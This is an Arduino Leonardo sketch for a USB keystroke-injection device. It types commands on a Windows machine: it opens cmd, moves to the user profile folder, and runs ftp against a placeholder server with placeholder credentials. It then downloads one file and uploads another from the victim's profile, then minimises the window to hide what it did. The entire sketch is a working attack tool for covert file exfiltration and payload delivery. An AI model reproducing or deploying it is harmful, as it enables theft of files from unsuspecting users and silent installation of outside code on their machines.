#define kbd_es_es
#include <phukdlib_leonardo.h>

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarMSWIN("cmd");
  delay(3000);
  Keyboard.println("cd %USERPROFILE%");
  delay(2000);
  Keyboard.println("ftp");
  delay(2000);
  Keyboard.println("open IPSERVERFTP");
  delay(5000);
  Keyboard.println("USERNAME");
  delay(2000);
  Keyboard.println("PASSWORD");
  delay(5000);
  Keyboard.println("GET ARCHIVOPARADESCARGAR");
  delay(2000);
  Keyboard.println("PUT ARCHIVOPARASUBIR");
  delay(2000);
  Keyboard.println("quit");
  delay(2000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  Keyboard.press('n');
  delay(100);
  Keyboard.releaseAll();
  while(1);
}
